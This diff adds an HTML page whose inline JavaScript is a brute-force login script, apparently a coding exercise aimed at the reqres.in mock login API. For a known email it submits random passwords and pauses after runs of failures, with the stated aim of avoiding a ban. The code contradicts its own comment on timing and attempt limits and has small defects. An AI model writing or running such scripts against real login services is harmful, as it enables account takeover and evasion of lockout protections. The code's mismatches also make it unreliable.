@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>axon</title>
+  </head>
+  <body>
+    <h1>axon</h1>
+
+    <div>
+    </div>
+
+    <script type="text/javascript">
+      /**
+        Create a small Brute-Force program to hack user credentials via this login 
+        API: https://reqres.in/api/login. See API description on the website.
+
+        * Assuming we know user email.
+        * Assuming we know password length (generate random).
+
+        To prevent us from being banned: 
+          * Call API every 100ms with some random delay.
+          * After 5 failures, sleep 5s.
+          * After 10 failures, sleep 10s.
+          * Stop after 1000 attempts until the next day.
+      */
+      let totalAttempt = 0;
+      let failureCount = 0;
+      let timer = null;
+      let sleep = 0;
+
+      function generatePassword(length) {
+        const chars = 'abcdefghijklmnopqrstuvwxyz';
+        let result = '';
+
+        for (let i = 0; i < length; i++) {
+          result += chars.charAt(Math.floor(Math.random() * chars.length))
+        }
+        return result;
+      }
+
+      async function attemptLogin() {
+        if(totalAttempt >= 15) {
+          console.log('Max attempt login reached for today.');
+          clearInterval(timer)
+          return;
+        }
+
+        const password = generatePassword(10);
+        const res = await fetch('https://reqres.in/api/login', {
+          method: 'POST',
+          // headers: {
+          //   "Content-Type": 'application/json'
+          // },
+          body: JSON.stringify({
+            email: 'eve.holt@reqres.in',
+            password
+          })
+        })
+        if(res.status === 400) {
+          failureCount++;
+          totalAttempt++;
+        }
+
+        if(failureCount === 5 && sleep === 0) {
+          console.log('Pausing after 5 failure ...');
+          clearInterval(timer);
+          await new Promise(resovle => setTimeout(resovle, 1000 * 5)) // sleep for 5s
+          failureCount = 0;
+          sleep = 1
+          tryToLogin();
+        }
+
+        if(failureCount === 10 && sleep === 1) {
+          console.log('Pausing after 10 failure ...');
+          clearInterval(timer);
+          await new Promise(resovle => setTimeout(resovle, 1000 * 10)) // sleep for 10s
+          tryToLogin();
+        }
+      }
+
+      function tryToLogin() {
+        timer = setInterval(() => {
+          attemptLogin();
+        }, 1000)
+      }
+
+      tryToLogin();
+
+   
+
+
+    </script>
+  </body>
+</html>
